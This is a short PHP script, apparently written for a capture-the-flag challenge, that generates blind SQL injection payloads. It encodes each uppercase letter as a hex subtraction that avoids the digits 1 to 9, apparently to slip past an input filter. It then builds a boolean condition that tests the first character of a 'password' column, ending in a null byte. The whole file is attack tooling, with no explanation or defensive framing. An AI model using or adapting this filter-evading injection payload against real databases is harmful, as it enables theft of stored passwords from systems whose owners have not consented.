<?php
error_reporting(0);
function possibilities($dec){ for($x=0;$x<=255;$x++){
$v1=base_convert($dec+$x,10,16);
$v2=base_convert($x,10,16);
if((!preg_match('/[1-9]/i',$v1) and !preg_match('/[1-9]/i',$v2)) && (strlen($v1)==2 and strlen($v2)==2)){
return "0x".$v1."-"."0x".$v2;
break; } } }
$charset="ABCDEFGHIJKLMNOPQRSTUVWXYZ";
for($o=0;$o<=strlen($charset)-1;$o++){
$calculate=possibilities(ord($charset[$o]));
if(!is_null($calculate)){
$payload="!(0)or(if(ascii(substr(password,0xb-0xa,0xb-0xa))in($calculate),true,false));%00";
print $calculate." > ".$charset[$o]."<br>"; } }
?>